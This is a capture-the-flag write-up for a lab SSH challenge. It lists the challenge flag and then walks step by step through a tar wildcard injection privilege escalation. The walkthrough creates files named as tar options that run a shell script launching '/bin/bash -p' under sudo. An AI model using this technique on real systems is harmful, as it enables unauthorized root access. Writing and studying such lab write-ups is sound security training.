# Army4

>
> ### user: PWNX{0fa6665d883acdbc36e74ef94b1b7543}
> 

## Description

A simple SSH server, but the user seems to have too much permissions.

## Technical description

The challenge focuses on the **TAR Wildcard Injection Privilege Escalation** vulnerability, which allows the pwnx user whose has the root sudo permissions to the `tar` binary, to gain instant root privileges on the system and read the flag.

## Writeup

The challenge presents the port `22/tcp (SSH)` open. On connection a user reads the lab banner and username and password needed for the SSH login. The pwnx user can execute the tar binary with root privileges. An attacker can exploit this excessive trust for the user and elevate his privileges to gain root acces on the system. In order to complete the challenge an attacker have to do some preparation steps to be sure that the exploit works.

These are the preparation steps:

```bash
$ mkdir -pv privesc # for convenience
$ cd privesc # Moving in the newly created directory
$ touch -- --checkpoint=1 # Creating the file '--checkpoint=1', notice the '--' as the first argument of the 'touch' command, This allows us to create files containing special characters
$ touch -- '--checkpoint-action=exec=bash shell.sh' # Creating the file '--checkpoint-action=exec=bash shell.sh'
$ echo '/bin/bash -p' >> shell.sh # Creating the file 'shell.sh' containing the command we want to be executed as root user
$ chmod +x shell.sh # Setting execution permissions on the 'shell.sh' file
```

Having all of this prepared, the attacker can execute the following command that at this point should give him a root shell:

```bash
$ sudo /usr/bin/tar -cvf archive.tar *
```
